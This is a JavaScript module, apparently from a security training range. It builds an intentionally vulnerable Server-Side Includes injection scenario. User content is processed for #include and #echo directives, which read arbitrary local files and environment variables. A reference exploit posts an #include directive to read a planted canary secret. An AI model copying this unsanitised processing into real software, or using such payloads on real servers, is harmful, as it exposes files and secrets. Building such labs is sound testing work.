// WSTG-INPV-08 (4.7.8) — Server-Side Includes (SSI) Injection behaviour.
// Submitted content is reflected into a page that the server processes for SSI
// directives (mod_include style). `#include` resolves a local file, `#echo`
// reads an env var, `#exec` is disabled. The canary lives in a server-side
// config fragment, reachable via an injected `#include` of its (hinted) path.

import fs from 'node:fs'
import path from 'node:path'
import { Scenario } from './scenario.mjs'

const FRAGMENT_PATH = process.env.POLYRANGE_SSI_SECRET_PATH || '/app/data/site.conf'

let secretWritten = false
function ensureFragment(canary) {
  if (secretWritten) return
  try {
    fs.mkdirSync(path.dirname(FRAGMENT_PATH), { recursive: true })
    fs.writeFileSync(FRAGMENT_PATH, `# site configuration fragment\nlicense_key=${canary}\n`)
    secretWritten = true
  } catch { /* best effort */ }
}

// Real SSI directive processing (mod_include-style).
export function processSSI(content) {
  let out = String(content)
  // #include virtual="X" / file="X"  -> read the file
  out = out.replace(/<!--#\s*include\s+(?:virtual|file)\s*=\s*"([^"]+)"\s*-->/gi, (_, p) => {
    const target = p.startsWith('/') ? p : path.join('/app', p)
    try { return fs.readFileSync(target, 'utf8') } catch { return '[include: not found]' }
  })
  // #echo var="X"  -> environment variable
  out = out.replace(/<!--#\s*echo\s+var\s*=\s*"([^"]+)"\s*-->/gi, (_, v) => process.env[v] ?? '')
  // #exec is disabled by default
  out = out.replace(/<!--#\s*exec\b[^>]*-->/gi, '[exec: disabled]')
  return out
}

export const classDef = {
  wstgId: 'WSTG-INPV-08',
  class: 'SSI Injection',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, scenario, helpers, renderPage, manifest }) {
    ensureFragment(manifest.perDeployCanary)
    if (req.method !== 'POST') return { status: 200, body: renderPage(editorPage(scenario)) }
    const content = new URLSearchParams(helpers.rawBody || '').get('content') || ''
    // VULNERABLE: user content is reflected into the page and SSI-processed.
    const rendered = processSSI(content)
    return {
      status: 200,
      body: renderPage(`<section style="max-width:640px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">${escapeHtml(scenario.fragmentNoun)} preview</h2>
  <div style="border:1px solid #e5e5e5;border-radius:8px;padding:16px;background:#fafafa">${rendered}</div>
</section>`),
    }
  },

  // Reference exploit: inject an SSI directive that reads the server-side
  // config fragment. Honours the supplied payload so T1's bypass variants
  // (case-flipped, virtual=, whitespace-padded, etc.) flow through unchanged.
  async fireExploit({ baseUrl, scenario, payload }) {
    const directive = (payload && typeof payload === 'string')
      ? payload
      : `<!--#include file="${FRAGMENT_PATH}"-->`
    const body = `content=${encodeURIComponent(directive)}`
    const r = await fetch(`${baseUrl}${scenario.endpoint.path}`, {
      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body, redirect: 'manual',
    })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

export const __test = { processSSI, ensureFragment, FRAGMENT_PATH }

function editorPage(scenario) {
  const sample = `Welcome to my page! &lt;!--#echo var="DATE_LOCAL" --&gt;`
  return `<section style="max-width:640px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <p style="font-size:13px;color:#666">Your content is rendered with server-side includes enabled. ${escapeHtml(scenario.fragmentNoun)} files resolve under <code>/app/data/</code> (e.g. the site config at <code>${FRAGMENT_PATH}</code>).</p>
  <pre style="background:#f3f3f3;padding:12px;border-radius:6px">${sample}</pre>
  <form method="POST" action="${scenario.endpoint.path}" style="margin-top:12px">
    <textarea name="content" rows="5" style="width:100%;font-family:ui-monospace,monospace;padding:8px" placeholder="enter your ${escapeHtml(scenario.fragmentNoun)} content"></textarea>
    <button type="submit" style="margin-top:8px;padding:9px 14px">Render preview</button>
  </form>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
